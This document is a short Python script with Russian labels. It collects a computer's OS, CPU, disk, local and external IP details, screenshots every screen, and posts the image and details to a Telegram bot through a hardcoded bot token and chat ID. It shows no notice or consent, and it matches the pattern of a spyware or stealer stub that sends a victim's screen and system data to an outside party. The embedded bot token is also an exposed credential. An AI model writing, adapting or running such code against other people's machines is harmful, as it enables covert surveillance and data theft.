import requests, io, platform, psutil
from PIL import ImageGrab
import socket as sock
from cpuinfo import cpuinfo


def get_size(byts, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if byts < factor: return f"{byts:.2f}{unit}{suffix}"
        byts /= factor

def System_information():
    output = "=" * 3 + " Информация о системе " + "=" * 3 + "\n"
    uname = platform.uname()
    output += f"📦 Система: {uname.system} {uname.release}\n"
    output += f"💻 Машина: {uname.machine}\n"
    # ЦП
    output += f"💣 Процессор: {cpuinfo.get_cpu_info()['brand_raw']}\n"
    output += f"💣 Общая загрузка ЦП: {psutil.cpu_percent()}%\n"
    # Диски
    output += "\n"
    output += "=" * 2 + " Диски " + "=" * 2 + "\n"
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            output += f"💿  Диск:  {partition.mountpoint}\n"
            output += f"    📁 Общий размер: {get_size(partition_usage.total)}\n"
            output += f"    📁 Свободно: {get_size(partition_usage.free)}\n"
        except PermissionError:
            continue
    # Интернет
    output += "\n"
    output += "=" * 2 + " Интернет IP " + "=" * 2 + "\n"
    lhost1 = f"{sock.gethostbyname(sock.gethostname())}"
    s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); lhost2 = s.getsockname()[0]
    output += f"🖥 Локальный IP: {lhost1}, {lhost2}\n"
    output += f"🌎 Внешний IP: {requests.get('https://api.ipify.org').text}"

    output += "\n\n#"+uname.system
    return output

def Desktop_Grab():
    img = ImageGrab.grab(all_screens=True)
    buf = io.BytesIO(); img.save(buf, format='PNG'); buf.seek(0)
    return buf

if __name__ == "__main__":
    info = System_information()
    screen = Desktop_Grab()

    token = '7539990102:AAFCEwvXc2yzf-FUD-UD8vH_uHM1Vfoo_NA'
    chat_id = 1320559926

    requests.post(f'https://api.telegram.org/bot{token}/sendPhoto',
                  data={'chat_id': chat_id, 'caption': info},
                  files={'photo': screen})
